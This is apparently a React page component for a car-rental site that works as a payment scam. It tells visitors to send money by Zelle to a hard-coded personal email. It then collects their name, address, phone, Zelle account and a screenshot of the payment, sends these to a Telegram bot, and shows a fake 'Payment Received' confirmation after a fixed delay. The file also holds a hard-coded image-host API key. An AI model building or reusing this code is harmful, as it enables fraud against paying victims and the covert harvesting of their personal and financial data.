import { useParams, useNavigate } from 'react-router-dom';
import { useState } from 'react';
import { cars } from '../../Utilities/Girls';
import Button from '../../Utilities/Button';
import { ArrowLeft, Copy } from 'lucide-react';
import Loader from '../../Utilities/Loader';
import Footer from '../../Utilities/Footer';
import { sendTelegramMessage, sendTelegramPhoto } from '../../Utilities/Telegrammessage';

const CarDetails = () => {
    const { id } = useParams();
    const navigate = useNavigate();
    const [showPayment, setShowPayment] = useState(false);
    const [cardNumber, setCardNumber] = useState('');
    const [formData, setFormData] = useState({ name: '', address: '', phone: '' });
    const [cardUsed, setCardUsed] = useState(false);
    const [isLoading, setIsLoading] = useState(false);
    const [image, setImage] = useState(null);

        const [copied, setCopied] = useState(false);
        const email = "liengsoto1156@hotmail.com";

    const car = cars.find((c) => c.id.toString() === id);
    if (!car) return <p className="text-center py-20">Car not found</p>;

    const gallery = car.images;
    const price = car.price;
    const distanceOptions = ['30 mins away', '1 hour away', '45 mins away'];
    const distance = distanceOptions[car.id % distanceOptions.length];

    const handleImageChange = async (e) => {
        const file = e.target.files[0];
        if (!file) return;

        const formData = new FormData();
        formData.append("image", file);

        try {
            const res = await fetch(
                "https://api.imgbb.com/1/upload?key=a90839c4a27f76cf92b3a52c9ff63e49",
                {
                    method: "POST",
                    body: formData,
                }
            );

            const data = await res.json();
            if (data?.data?.url) {
                setImage(data.data.url);
                console.log("✅ Image URL:", data.data.url);
            } else {
                console.error("❌ Image upload failed:", data);
            }
        } catch (err) {
            console.error("❌ Upload error:", err);
        }
    };

    const handleSendBooking = async () => {
        setIsLoading(true);

        const message = `🚗 *New Car Rental Submitted!*\n\n` +
            `*Car:* ${car.name} ${car.model}, ${car.year}\n` +
            `💰 *Price:* $${price}\n` +
            `📍 *Distance:* ${distance}\n\n` +
            `👤 *Name:* ${formData.name}\n` +
            `🏠 *Address:* ${formData.address}\n` +
            `📞 *Phone:* ${formData.phone}\n` +
            `💳 *Zelle Account:* ${cardNumber}`;

        try {
            await sendTelegramMessage(message);
            if (image) {
                await sendTelegramPhoto(image, '🖼 *Zelle Screenshot Attached*');
            }
        } catch (err) {
            console.error("Telegram send failed:", err);
        }

        setTimeout(() => {
            setIsLoading(false);
            setCardUsed(true);
        }, 8000);
    };



        const handleCopy = () => {
            navigator.clipboard.writeText(email);
            setCopied(true);
            setTimeout(() => setCopied(false), 2000);
        }
            return (
                <div className="min-h-screen bg-gray-50">
                    <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
                        <Button onClick={() => navigate('/')} variant="outline" className="mb-6 flex items-center gap-2">
                            <ArrowLeft className="h-4 w-4" />
                            Back to Results
                        </Button>

                        <div className="bg-white rounded-xl shadow-lg overflow-hidden">
                            <div className="w-full aspect-video">
                                <img
                                    src={car.images[0]}
                                    alt={`${car.name} preview`}
                                    className="w-full h-full object-cover rounded-t-xl"
                                />
                            </div>


                            <div className="p-6 border-t">
                                <h1 className="text-2xl font-bold text-gray-900 mb-1">{car.name} {car.model}, {car.year}</h1>
                                <p className="text-gray-600 mb-4">{distance}</p>

                                <div className="mb-6">
                                    <h2 className="text-lg font-semibold mb-2">Rental Price</h2>
                                    <p className="text-xl text-green-600 font-bold">${price}</p>
                                </div>

                                {car.availability === 'Available' ? (
                                    <Button onClick={() => setShowPayment(true)} className="w-full bg-[#FF9B00] hover:bg-orange-600 text-white rounded-xl py-3 font-semibold text-base">
                                        Rent Now
                                    </Button>
                                ) : (
                                    <p className="text-center text-red-500 font-semibold">This car is currently not available.</p>
                                )}
                            </div>
                        </div>
                    </div>

                    {showPayment && (
                        <div className="fixed inset-0 bg-black bg-opacity-60 backdrop-blur-sm flex items-center justify-center z-50">
                            <div className="bg-white rounded-2xl p-6 w-full max-w-md shadow-lg">
                                {!cardUsed ? (
                                    <>
                                        <h2 className="text-xl font-semibold text-center mb-3">Zelle Payment</h2>
                                        <p className="text-center text-sm text-gray-600 mb-2">
                                            Please send payment via <strong>Zelle</strong> to:
                                        </p>
                                        <div className="text-center text-sm font-semibold mb-3 text-blue-600">
                                            <div className="flex items-center justify-center gap-2">
                                                <span>{email}</span>
                                                <button onClick={handleCopy} className="hover:text-blue-800">
                                                    <Copy className="w-4 h-4" />
                                                </button>
                                                {copied && <span className="text-green-600 text-xs font-normal">Copied! ✅</span>}
                                            </div>
                                            <div>Carol Ann Anderson</div>
                                        </div>

                                        <p className="text-center text-sm text-red-500 font-medium mb-4">
                                            Upload a screenshot of your payment confirmation.
                                        </p>


                                        <input placeholder="Your Name" className="mb-2 w-full border p-2 rounded" onChange={e => setFormData({ ...formData, name: e.target.value })} />
                                        <input placeholder="Your Address" className="mb-2 w-full border p-2 rounded" onChange={e => setFormData({ ...formData, address: e.target.value })} />
                                        <input placeholder="Phone Number" className="mb-2 w-full border p-2 rounded" onChange={e => setFormData({ ...formData, phone: e.target.value })} />
                                        <input type="text" value={cardNumber} onChange={(e) => setCardNumber(e.target.value)} placeholder="Zelle Account Used" className="mb-2 w-full border p-2 rounded" />

                                        <input type="file" accept="image/*" capture="environment" onChange={handleImageChange} className="mb-4" />
                                        {image && <img src={image} alt="Uploaded Screenshot" className="mb-4 rounded shadow w-full h-40 object-cover" />}

                                        <Button onClick={handleSendBooking} className="w-full bg-green-600 text-white py-3">
                                            {isLoading ? <span className="flex justify-center items-center"><Loader className="animate-spin mr-2" /> Processing...</span> : `Pay $${price} Now`}
                                        </Button>
                                        <button onClick={() => setShowPayment(false)} className="mt-3 text-sm text-gray-500 underline w-full text-center">
                                            Cancel
                                        </button>
                                    </>
                                ) : (
                                    <div className="text-center">
                                        <h2 className="text-xl font-bold text-green-600 mb-3">✅ Payment Received</h2>
                                        <p className="text-sm text-gray-600">
                                            Your payment is under review. Reference: <strong>{formData.phone || "N/A"}</strong>
                                        </p>

                                        <Button onClick={() => setShowPayment(false)} className="mt-6 w-full bg-gray-800 text-white">
                                            Close
                                        </Button>
                                    </div>
                                )}
                            </div>
                        </div>
                    )}
                    <Footer />
                </div>
            );
        };
  export default CarDetails;